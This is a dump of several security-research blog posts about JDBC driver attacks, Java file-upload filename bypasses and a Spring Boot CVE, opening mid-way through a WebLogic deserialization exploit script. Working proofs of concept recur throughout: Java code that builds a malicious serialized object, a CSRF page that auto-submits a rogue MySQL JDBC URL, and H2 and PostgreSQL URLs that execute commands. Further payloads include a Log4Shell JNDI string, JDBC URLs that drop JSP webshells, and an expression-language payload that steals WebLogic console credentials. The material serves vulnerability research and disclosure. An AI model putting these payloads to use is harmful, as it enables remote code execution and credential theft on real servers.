xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78&#x27;# adjust header for appropriate message lengthpayload=struct.pack(&#x27;&gt;I&#x27;,len(payload)) + payload[4:]print(&#x27;[+] Sending payload...&#x27;)sock.send(payload)data = sock.recv(1024)sys.stderr.write(&#x27;&#123;&#125; Received &#123;&#125;&#x27;.format(&#x27;\\r\\n&#x27;,data)) WeblogicOJDBC.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package ysoserial.exploit;import oracle.jdbc.internal.OpaqueString;import oracle.jdbc.pool.OraclePooledConnection;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Properties;public class OracleJdbc &#123; public static void main(String[] args) throws Exception &#123; Properties properties = new Properties(); properties.put( &quot;InitialLimit&quot;, &quot;1&quot; ); properties.put( &quot;MinLimit&quot;, &quot;1&quot; ); properties.put( &quot;MaxLimit&quot;, &quot;5&quot; ); Class&lt;?&gt; clazz1 = Class.forName(&quot;oracle.jdbc.driver.OracleDriverExtension&quot;); Class&lt;?&gt; clazz2 = Class.forName(&quot;oracle.jdbc.driver.T4CConnection&quot;); Constructor&lt;?&gt; constructor = clazz2.getDeclaredConstructor(String.class, Properties.class , clazz1); constructor.setAccessible(true);//ip Object obj = constructor.newInstance(&quot;jdbc:oracle:thin:@&quot; + &quot;127.0.0.1:1521&quot; + &quot;:src&quot;, properties, null);//password Class&lt;?&gt; clazz3 = Class.forName(&quot;oracle.jdbc.internal.OpaqueString&quot;); Constructor&lt;?&gt; declaredConstructor = clazz3.getDeclaredConstructor(String.class); declaredConstructor.setAccessible(true); OpaqueString opaqueString = (OpaqueString)declaredConstructor.newInstance(&quot;123456&quot;); Field password = clazz2.getDeclaredField(&quot;password&quot;); password.setAccessible(true); password.set(obj, opaqueString);//userName Class&lt;?&gt; clazz4 = Class.forName(&quot;oracle.jdbc.driver.GeneratedPhysicalConnection&quot;); Field userName = clazz4.getDeclaredField(&quot;userName&quot;); userName.setAccessible(true); userName.set(obj, &quot;root&quot;);//physicalConn//Gain Runtime Object OraclePooledConnection oraclePooledConnection = new OraclePooledConnection(); Field physicalConn = oraclePooledConnection.getClass().getDeclaredField(&quot;physicalConn&quot;); physicalConn.setAccessible(true); physicalConn.set(oraclePooledConnection, obj);// Serialzation Data FileOutputStream fos = new FileOutputStream(&quot;poc.ser&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(oraclePooledConnection); &#125;&#125;","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Make JDBC Attacks Brilliant Again I","slug":"Make-JDBC-Attacks-Brillian-Again-I","date":"2022-06-06T09:35:53.000Z","updated":"2022-06-14T06:23:47.406Z","comments":true,"path":"2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/","link":"","permalink":"http://yoursite.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/","excerpt":"","text":"0x01 ForewordsIn HITB Singapore 2021, we made a presentation about JDBC attacks.Here is the detailed write-up about the talk. 0x02 JDBC IntroductionThe JDBC API is a Java API that can access any kind of tabular data, especially data stored in a relational database. JDBC helps you to write Java applications that manage these three programming activities: Connect to a data source, like a database Send queries and update statements to the database Retrieve and process the results received from the database in answer to your query Actually, JDBC is a set of standard interfaces and a particular relational database has its own implement, like JDBCMysqlImpl in MySQL JDBC driver. I draw the following picture to describe these implements. It is mainly in the java.sql package in JDK, JDBC drivers are client-side adapters , installed in the client endpoint, not in the server side. It can convert requests from Java programs to a protocol that the DBMS can understand.JDBC drivers provide JDBC specific implementations for different databases . For developers, JDBC helps shield the specifics of individual databases. The following simple code fragment gives an example. The short code fragment instantiates a DriverManager object to connect to a database driver and log into the database. It occured to me that if the JDBC URL is under control, what will take place? According to the above picture, the basic attack assumptive steps are as follow: Sets a malicious JDBC URL and triggers the JDBC connection. As the client side, it connects to the malicious server which specified by the attacker with JDBC driver. Take advantage of the security flaws or some particular properties of the JDBC drivers to trigger these vulnerabilities. Before my new research, I focus on some disclosed cases. So it starts with the in-depth analysis of the historical vulnerablities. 0x03 Review Historical IssuesMySQL Client Arbitrary File Reading VulnerabilityThis vulnerability is caused by the existed MySQL feature for a long time. The feature is that the Load Data Local Infile statement can read client files and send them to the server. There is no doubt that this feature is very risky. The MySQL official document clearly states that clients should not connect to any untrusted server. To tell the truth, is that it’s always hard to make sure. And since this is the specification of MySQL, it can affect most clients, including the MySQL JDBC driver. An attacker can forge a malicious MySQL server and after the client connecting, the client will send some initializing query packets such as sending query to SET NAMES with charset utf-8, then the malicious server can send a file transfer packet specifying to read any file from the client. MySQL JDBC Client Deserialization VulnerabilityActually the MySQL JDBC deserialization vulnerability was firstly mentioned by Thijs Alkemade in 2017. This report named Unexpected automatic deserialisation of Java objects was assinged as CVE-2017-3523 eventually. Until 2019, a further research is disclosed by ZhangYang and his team mates. They made a presentation named &lt;New Exploit Technique In Java Deserialization Attack&gt; in Black Hat Europe. When MySQL JDBC directly deserializes certain types of data returned from the server, It can result in a remote code execution if the gadgets are appropriate. Using the statementInterceptors property provided by the JDBC driver, you can set an interceptor to perform additional operations before or after the certain kinds of statements. The full attacking chains are as follows Firstly, set the statementInterceptor attribute to ServerStatusDiffInterceptor, auditing ServerStatusDiffInterceptor code, you can see that this interceptor allows the client to send specific queries to the server, In addition, the getObject method is used to process the returned column. Secondly, in the getObject method, the driver will directly call the readObject method for deserialization of binary and blob types. Therefore, the server side controlled by the attacker can trigger deserialization vulnerabilities as long as it returns falsified serialized data. Of course, the class and property names of interceptors are different in various version of JDBC driver as shown in the table. Weblogic RCE involving MySQL JDBC DeserializationI look for some real world scenarios of MySQL JDBC connection configuration. I suddenly realize that data source can be specified by user in Weblogic server console and MySQL JDBC driver is built-in.Consequently I can customize the JDBC URL with some particular properties. And then I analyze the Weblogic server source code to make sure that. Unfortunately, it needs the authorization. I hope to make it much more harmful, then I figure out there is no CSRF token check of createJDBCDataSourceForm. Eventually, I construct the PoC like this 123456789101112&lt;html&gt;&lt;body&gt;&lt;form name =&quot;wls&quot; target=&quot;frame&quot; action=&quot;http://weblogic-server-ip:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortletdriverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortleturl&quot; value=&quot;jdbc:mysql://rogue-mysql-server-ip:3306/demo?user=root&amp;password=password&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot; /&gt;&lt;/form&gt;&lt;iframe name=&quot;frame&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;&lt;script&gt;document.wls.submit()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; When the administrator clicks the link of the above HTML page, the remote code will executed. I reported the bugs to Oracle. Then CVE number are assigned as CVE-2020-2869, CVE-2020-2934. SpringBoot H2 Console RCE with JDBC DriverWhen SpringBoot H2 database console is enabled, we can access the endpoit /h2-console/ to administrate the H2 database with a web page. However,the JDBC URL of H2 database is on supportive of the INIT parameter. It can be utilized to execute an initialization SQL sentence, meanwhile, an external SQL script can be imported by RUNSCRIPT FROM. Here is the illustration in SpringBoot H2 console First of all, we have to review the source code to figure out why we use the RUNSCRIPT FROM statement. During debugging the source code, we know that the INIT property is on supportive of executing any SQL statement, but you have to merge multiple SQL sentences into one. So we naturally choose RUNSCRIPT FROM key word to invoke a remote SQL script. Refer to the illustration, there is a disadvantage that a HTTP request is required with RUNSCRIPT FROM key word. Usually establishing a HTTP protocol request to the external network is forbbiden. After further testing, I find another way of using \\ to translate ;. multiple sentences are merged into one, that meets all our requirements. 12jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\\;return &quot;test&quot;\\;&#125;&#x27;\\;CALL EXEC(&#x27;open -a calculator&#x27;) Of course, we can use other sentences. The CREATE ALIAS Function key words are combined with an additional CALL key word in multiple SQL sentences, but they are both necessary in the same time. After more in-depth analyses of the source code. We find that the JAVA METHOD defined in CREATE ALIAS AS sentence is all handled by the method SourceCompiler. It supports three kinds of processing logic, Java, JavaScript and Groovy, all of which are compiled in order to finally execute the ALIAS function. The parseClass of Groovy catches my eye and it occurs to me that Orange Tsai made a presentation named &lt;Hacking Jenkins Part 2&gt; in 2019. Is is about abusing meta programming. Here is the official introduction about the @asttest annotation. It is triggered by parseClass method. Finally we can execute malicious java code in assertions. However, in the real world, Groovy dependencies are not built into H2 database environment. So this attack depends on whether Groovy components are included into the application. Obviously it does not make sense. So we continue to look for another way to attack, reviewing the source code, we quickly discover that in addition to the CREATE ALIAS AS sentence, there is another sentence can input a customized source code. In the parsing of the CREATE Trigger statement, finally, we can call loadFromSource method of the TriggerObject class. We are pleasantly surprised to find that in this method, the javascript source code is not only compiled but also executed. As the source code showing, it calls the eval() method directly. And since ScriptEngine is finally used for execution with no sandbox implement, we could input any java class fragment we wanted in javascript. So with this, we can easily achieve the purpose of RCE without the CALL or other sentences. As the PoC shows,JavaScript scripts start with JavaScript comments, and then we can then simply use java.lang.Runtime.getRuntime().exec() method to achieve RCE. JBoss /Wildfly Server Console RCE with JDBC DriverHere is another sample we use H2 database JDBC driver to execute remote malicious code, you can refer to the SpringBoot H2 RCE sample. IBM DB2 RCE with JDBC DriverAfter the above research, I realize some properties of JDBC driver could directly lead to vulnerablities. I read the official documents of IBM DB2 JDBC driver to search the potential suspicious properties. I noticed a property called clientRerouteServerListJNDIName, the official description as follows As described in the document, if the first connection to the data source fails, this property will provide an alternative server location.The Lookup method of the context is finally called for performing a JNDI lookup according to the source code fragment. So it is easy to imagine that if a malicious JNDI location is provided and the client fails to the connect the first location, then it will look up the second malicious JNDI location. Obviously, it is a well-known JNDI injection vulnerability. When the client connects to the malicious LDAP server, it will load the malicious java class from the remote codebase.Here is the final PoC ModeShape RCE with JDBC DriverModeShape is a lightweight, fast, and pluggable JCR repository that federates and unifies content from multiple systems, including files systems, databases, configuration files, other repositories, services, applications, and data grids. The full name of JCR is Content Repository API for Java is a specification for a Java platform application programming interface API to access content repositories in a uniform manner. Using the JCR API, you can get data from a variety of different systems, including file systems, relational databases and so on. A standard JCR connection for ModeShape is in the format shown bellow, which requires repositoryName to make a connection to an existing repository. In this way, the JNDI string in the connection URL gets our attention, and we reasonably assume that in addition to supporting the JCR protocol, other protocols such as LDAP should also be supported. After futher testing, it turns out that we can indeed initiate a JNDI lookup request to a specified LDAP server, so this is another typical JNDI injection vulnerability. Apache Derby with JDBC DriverApache Derby is an open source relational database implemented entirely in java. It can be used as an embedded database just like H2 database. With embedded databases, it is usually easier to implement attacks because the server and client can exist in the same project. We find a suspicious java code fragment when we look for sensitive calls in the Apache Derby driver code.There is a readMessage method in the SocketConnection class. The readObject method is invoked directly, which is always used to deserialize input stream in java. This code fragment obviously exists a deserialization vulnerability. In fact, from a security code point of view, this SocketConnection class is suspicious. You can see from its construct method, it wraps a socket and wraps socket Outputstream and Inputstream into object OutputStream and ObjectInputStream. The readMessage method seems to read and parse the socket Inputstream. If we can communicate with the wrapped socket, then we will probably be able to trigger the deserialization vulnerability. So we go back to the invocation chains and see how to call the readMessage method.We find that the caller is the inner class MasterReceiverThread of ReplicationMessageTransmit class. As you can guess from the class names and package names. These code fragments are relate to Apache Derby feature to replicate databases. I go through the Apache Derby documentation section on replicating databases and know that database replication can be initiated with JDBC connection property, which is exactly what we need. Also the connection property is controllable. In fact, if you go all the way up the call chain, you can see that whether this thread is started depends on whether the startMaster property is enabled. As the code showing, isStartReplicationMasterBoot method used for judgment. And in the code ,we can find that we can specify which host the socket connects to by controlling the slaveHost property. So we can set the startMaster property as true and the slaveHost property to the malicious server, then Apache Derby will try to connect to the malicious slave server and communicate with each other. At this point, the responsed malicious serialization data stream will be automatically deserialized, thus achieving the RCE purpose. The malicious connection PoC in the following code And the evil slave sever code is as follows Obviously the evil slave sever can return the serialized data directly after the connection receiving. SQLite RCE with JDBC DriverSQLite is also a lightweight embedded database. How to exploit it? we look up the code for its connection and find that when the JDBC URL is controllable, then we can customize its resourceName in the open method as follows Stepping into the extractResource method, we can see that the URL constructed by resourceName calls openStream method , so this can be used to achieve the SSRF attack as follow, 1jdbc:sqlite::resource:http://127.0.0.1:8888/poc1.db Send an HTTP request to specific ip address with JDBC connection. However, SSRF attack is not stratified our purpose. Using the resource subprotocol of SQLite, you can connect to the specified IP to download the specific database files, that is, if the JDBC URL is under our control, we can control the database files which the client side opens.With these clues, how should we attack? Referring to &lt;SELECT code_execution FROM * USING SQLite&gt; which descripts how to gain code execution using a malicious SQLite database. We can consider a scenario that there is a controllable JDBC URL and an uncontrollable SELECT statement. A brief code is shown in the figure. The URL is controllable, but the SQL statement executed are not controllable. In the controllable database file, there is a Data Definition Languae (DDL) statements used to CREATE TABLE or VIEW. The DDL statements actually appear as a plain text. If we inspect that the uncontrollable statement is SELECT * from TABLE, we can CREATE VIEW names pyn3rd to hijack the SELECT statement to execute a subquery customized in the CREATE VIEW DDL file. In this way, we can transform the SQL statement that we cannot control into the query statement that we can control. The next step, if we have a controllable JDBC URL connection, we can enable the load_extension option in SQLite. So if we have a controlled file, we can archive RCE purpose by loading this extension. In fact, the extension is a Dynamic Link Library or Shared Object. In SELECT statement, load_extension function can load a .ddl or .so file and execute sqlite3_extension_init function in it. So input the malicious code in sqlite3_extension_init function can trigger the remote code excution. Actually getting a manageable file is not always easy. Since Sqlite often bursts memory corruptions vulnerabilities, we can use these memory corruptions to attack. As shown in the code bellow, we can use Magellan PoC to create a local SQLite database with a malicious security VIEW. The Magellan is a number of vulnerabilities that exist in SQLite caused by memory corruptions.Specify a JDBC connection to download our database file and open it. When the code executes to query for security table, it will trigger a JVM crash. However, RCE is the final objective. Here is the PoC Open Source Project JDBC Attack Defense PolicyAccording to the previous attack methods, we can find that vulnerabilities usually appear in some special JDBC properties. So some open source projects take the method of filtering sensitive properties to fix such vulnerabilities. Apache Druid as well as Apache DolphinScheduler have been exposed to MySQL JDBC deserialization vulnerabilities in the past, so we focus on the two open source softwares . The CVE numbers for the two vulnerabilities are CVE-2021-26919 and CVE-2020-11974. Apache Druid defines a whitelist of properties. Only the properties in the whitelist are permitted. Otherwise, Apache DolphinScheduler removes sensitive properties from parameters. Is there a new exploitable way to bypass property filter? We choose Apache Druid, which uses the MySQL-connector-5.1.48 as our target. For this fix, the first idea is to see if the filter parameters method is consistent with the JDBC connection processing parameters method. You can see in the Apache Druid source code that the filter use the MySQL connector default parse URL method.By default they are consistent. Therefore, we jump out of this idea and take a look at the overall JDBC Driver loading logic. For the loading of JDBC Driver, they use SPI technology.full name is Java Service Provider Interface. For JDBC, all registered drivers are stored in the java.sql.Driver.In 5.1.48 versions of MySQL connector ,there are two registerd drivers, one is the common JDBC driver, the other is FabricMySQLDriver. This FabricMySQLDriver has caught our attention. Refer to the MySQL driver documentation, you can see that FabricMySQLDriver is used to connect to the MySQL Fabric System. MySQL Fabric is a system for managing a farm of MySQL servers. We start researching in the source code of FabricMySQLDriver.If you pass in a URL that starts with the format as the code showing, it goes into the Fabric Driver processing logic. You can see that in the code the connection URL is concated by the FabricProtocol, Host and Port parameters. Trace the FabricProtocol parameter,We can find that it is default to HTTP protocol . Enter the FabricConnection method, In this case, you can see that it uses the XMLRPC Client. Continuing to step into it, we find that it finally makes an XMLRPC call in the errorSafeCall Method and we can specify host and port of this call. So it looks like we’ve got an SSRF vulnerability, but it’s not enough. Similar to the MySQL deserialization vulnerability, we go on seeing if the Fabric MySQL driver had made any errors during processing the revieved data. It is clearly visible in the code that it use the newSAXParser method of the SAXParserFactory directly to get a SAXParser, where the SAXParserFactory does not set any security attributes, is an obvious XXE vulnerability, which finally can cause an arbitity file reading or SSRF attack. So the idea of attack is very clear. We construct a specific JDBC URL to enter the processing logic of Farbic Driver, set the Host and Port in the JDBC URL to our malicious HTTP server and when the client establishes a connection, it will send an XMLRPC request to the server. We control the HTTP server to return a malicious XML document ,and then XXE vulnerability will be triggered when the client processes this XML Documnet. We can read the corresponding files from the client by using the out-of-band XML External Entity attack. The connection code of the client is shown in the figure. We can trigger the XXE vulnerability without any parameters. The malicious HTTP service code is shown as follows.To constrocut the mailicious XML Documnet is easy. ConclusionWe have researched on JDBC attacks of the diverse main stream databases for a couple of weeks.Making the JDBC URLs customized will carry a big risk.It is recommended that if you have to make JDBC URLs customized, you should strictly restrict the JDBC URLs either properties or protocols.","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Make JDBC Attacks Brilliant Again II","slug":"Make-JDBC-Attacks-Brilliant-Again","date":"2022-06-02T02:57:00.000Z","updated":"2022-10-12T03:04:30.909Z","comments":true,"path":"2022/06/02/Make-JDBC-Attacks-Brilliant-Again/","link":"","permalink":"http://yoursite.com/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/","excerpt":"","text":"0x01 ForewordsI made a presentation about JDBC attack interface at HITB Singapore security conference in 2021. The title of this talk is &lt;Make JDBC Attacks Brilliant Again&gt; , if you are interested, the slide link is as follow https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf However PostgreSQL database was not included in that presentation, and recently JDBC attacks in PostgreSQL database is mentioned. So I make a capsule write-up , I consider it is the exta chapter of &lt;Make JDBC Attacks Brilliant Again&gt;. 0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）Just like other JDBC drivers, PostgreSQL JDBC driver is on supportive of many properties. Let me start with the pair of properties in CVE-2022-21724 a. socketFactory / socketFactoryArg Official document introduction As always, debug and figure out the internal function calling procedure, here, my PostgreSQL driver version is 42.3.1, I write the following code in order to print version. 1System.out.println(&quot;PostgreSQL Driver Version: &quot; + org.postgresql.Driver.class.getPackage().getImplementationVersion()); Set the property empty and execute the code, it throws exceptions. Refer to the exceptions, set tne breakpoint at getSocketFactory() Then step into ObjectFactory.instantiate() According to this, we figure out socketFactory is used to initialize objects and there is only one string type argument of the constructor. Therefore we only need to look for an eligible class, it reminds me of the couple of classes as follow org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext We can load the following XML file by one of the above classes 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;open&lt;/value&gt; &lt;value&gt;-a&lt;/value&gt; &lt;value&gt;calculator&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; Start a ftp server python3 -m pyftpdlib -d . Check the result Maybe it also reminds someone of another class, like java.io.FileOutputStream. Utilize the class and ../../ to archive traveral path and empty an file arbitrarily. In my illustation, I create an empty file named test.log. b. sslFactory / sslFactoryArg Official document introduction Actually, they are as similar as socketFactory/socketFactoryArg, only a little differencs, the couple of properties are utilized to judge whether it is an encrypted connection with a SSL handshake.About SSL handshake judgement, we can figure out if the recieved request starting with big letter S after establishing connection, it is on supportive of SSL protocol. Then step into SSLSocketFactory() Next step, focus on SSLSocketFactory From here on, the code logic is the same as before.To avoid repetition, it’s not described in this article.Consequently we only give a response with big letter S after establishing connection, it will be trigged successfully. c. Weblogic Server Remote Code Execution I mentioned this class org.springframework.context.support.FileSystemXmlApplicationContext in the above illustration.But in Weblogic Server, there is a similar class com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext Pay attention to check these two jar files as follow They are both necessary, fortunately built-in by default. Finnally construct the PoC 1jdbc:postgresql://127.0.0.1:5432/testdb?&amp;socketFactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&amp;socketFactoryArg=ftp://127.0.0.1:2121/bean.xml Check the result 0x03 PostgreSQL JDBC Driver arbitrary file writea. loggerLevel / loggerFile Official document introduction So PoC can be contructed like this jdbc:postgresql://localhost:5432/testdb?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log b. Log4Shell Logger Injection Apparently even though the database connection is failed, all the logs will be written into the specific log file. In order to pollute the log file, we can insert Log4Shell payload into JDBC connection URL. 1jdbc:postgresql://localhost:5432/$&#123;jndi:ldap://127.0.0.1:1389/eajmgl&#125;?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log When using Apache Log4j2 library to read polluted log file, RCE will be triggered. c. Weblogic Server Concise Webshell In order to check the result easily, I use another property ApplicationName. Honestly it’s not necessary. Try to create a Webshell with a line of concise JSP code. The target directory is../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/ The preliminary payload seems like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=&lt;%Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;;%&gt;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jsp Unfortunately it throws exceptions directly, Weblogic Server will decode %Ru (% and the next two characters Ru) with URLDecoder() method,the exception is as follow 1Could not establish a connection because of java.lang.IllegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: &quot;Ru&quot;&lt;br/&gt; Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding % exceptionally. By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3 is supportive of Expression Language by default. Everything is ready. The final PoC like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp Access Webshell URL, then the calculator pops up. d. Weblogic Server Console Password Stealing Webshell In the above illustration, I replace JSP with Expression Language successfully, but Expression Language is limited, for example, value cannot be assigned to a variable. As we know,the Expression Language defines a set of implicit objects,like pageContext, it’s pretty useful. When instantiating the class javax.servlet.jsp.PageContext, we create an object pageContext, it represnets the entire JSP page. Set attribute with pageContext.setAttribute() method and get attribute with pageContext.getAttribute(). If the page scope is not appointed，the order will be page → request → session → application. Page scope is the default, and the pageContext object belongs to page scope. If you know about the above acknowledge, using Java reflection can achieve the desired effect. So the final PoC like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;pageContext.setAttribute(&quot;classLoader&quot;,Thread.currentThread().getContextClassLoader());pageContext.setAttribute(&quot;httpDataTransferHandler&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler&quot;));pageContext.setAttribute(&quot;managementService&quot;, pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.ManagementService&quot;));pageContext.setAttribute(&quot;authenticatedSubject&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;));pageContext.setAttribute(&quot;propertyService&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.PropertyService&quot;));pageContext.setAttribute(&quot;KERNE_ID&quot;,pageContext.getAttribute(&quot;httpDataTransferHandler&quot;).getDeclaredField(&quot;KERNE_ID&quot;));pageContext.getAttribute(&quot;KERNE_ID&quot;).setAccessible(true);pageContext.setAttribute(&quot;getPropertyService&quot;,managementService.getMethod(&quot;getPropertyService&quot;,pageContext.getAttribute(&quot;authenticatedSubject&quot;)));pageContext.getAttribute(&quot;getPropertyService&quot;).setAccessible(true);pageContext.setAttribute(&quot;prop&quot;,pageContext.getAttribute(&quot;getPropertyService&quot;).invoke(null,pageContext.getAttribute(&quot;KERNE_ID&quot;).get((null))));pageContext.setAttribute(&quot;getTimestamp1&quot;,propertyService.getMethod(&quot;getTimestamp1&quot;));pageContext.getAttribute(&quot;getTimestamp1&quot;).setAccessible(true);pageContext.setAttribute(&quot;getTimestamp2&quot;,propertyService.getMethod(&quot;getTimestamp2&quot;));pageContext.getAttribute(&quot;getTimestamp2&quot;).setAccessible(true);pageContext.setAttribute(&quot;username&quot;, pageContext.getAttribute(&quot;getTimestamp1&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.setAttribute(&quot;password&quot;,pageContext.getAttribute(&quot;getTimestamp2&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.getAttribute(&quot;username&quot;).concat(&quot;/&quot;).concat(pageContext.getAttribute(&quot;password&quot;))&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/passwd.jsp At last, access the Webshell which we create. Steal the username and password successfully, they are log-in credentials of Weblogic Server administration console. 0x04 ConclusionJDBC is widely used because of the Java language.So the attack interface of JDBC makes a great impact. One scenario is cloud computing platform, the users can configure their JDBC connections of a cloud database service.The other scenario is authorization bypass weakness in Java frameworks.Both the scenarios make JDBC connection URL controllable easily. I summarize my research as a write-up and hope someone insterested with the attack interface will follow my research and keep on making JDBC attacks brilliant again!","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Arbitrary File Upload Tricks In Java ","slug":"Arbitrary-File-Upload-Tricks-In-Java","date":"2022-05-07T04:05:00.000Z","updated":"2022-06-21T02:01:39.257Z","comments":true,"path":"2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/","link":"","permalink":"http://yoursite.com/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/","excerpt":"","text":"0x01 ForewordsRecently I see some discussions about arbitrary file upload in Java environment on Internet. The main takling points are how to bypass file name detection when uploading arbitrary file. Consequently I write this article to summerize the tricks. 0x02 Juicy Tricks Use getSubmittedFileName method to obtain file name When we use original Servlet to develop a multipart format file upload feature in Java, getSubmittedFileName() method is often utilized to obtain the file name, especially in early Java applications. But a potential problem involving this method. We can debug the code to analyse it.Firstly set the breakpoint at getSubmittedFileName , then step into the next method named HttpParser.unquote(), here is the place which file name is obtained. During debugging the code, we can find that when file name containing \\ , it will be omitted. Finally the file name becomes pyn3rd.jsp So we can use this peculiarity to evade file name detection，like regular expression based WAF. Significantly, we also can use one single &quot; in filename parameter value with one characters appended to file extension and one \\ in filename. Use getOriginalFilename method to obtain file name As we know, the scenario of multipart format file upload in SpringBoot, we are used to utilize getOriginalFilename() method to obtain file name,it can obtain file name directly without any file name changes. However, when we use another method named StringUtils.cleanPath() to normalize the file name which getOriginalFilename() method obtains, another peculiarity existing. We can use one or more /. to append the file name. / is used as a delimiter and . means the current directory. If it points to current directory,just drop it. So the result of the file name is pyn3rd.jsp By the way, in Java (Windows system), \\ is always transformed to /, when we encounter SSRF/XXE vulnerablities, trying to replace \\ with /, for example, http:\\/ replaces http:// Use Apache commons-fileupload/commons-io method to obtain file name We can also use some common Java libraries like org.apache.commons.fileupload.FileItem.getName or org.apache.commons.io.FilenameUtils.getName to obtain file name. For example,commons-io is analyzed as follow If / or /[SPACE] is appended at the end of the file name. In the other words, / with zero character or null character, the results of the file name are both pyn3rd.jsp If / or /[SPACE] is appended at the end of the file name.In case of the non-blank characters existing behind the delimiter /,the characters behind / will be obtained as the file name. 0x03 ConclusionThe different normalization results depend on the implements of varied jar libraries and the personal habbits of developers. If the developers don’t know about this, potential vulnerablities seem inevitable. Thus, the in-depth research of normalization diversities will help us evade defense.","categories":[],"tags":[],"author":"pyn3rd"},{"title":"CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal","slug":"CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal","date":"2021-10-25T06:28:19.000Z","updated":"2021-10-25T08:20:53.316Z","comments":true,"path":"2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/","link":"","permalink":"http://yoursite.com/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/","excerpt":"","text":"AbstractPrior to spring-boot-actuator-logview 0.2.13, the securityCheck() method exists in LogViewEndpoint, but the securityCheck() method only filter the .. in fileName, ignoring the security check of 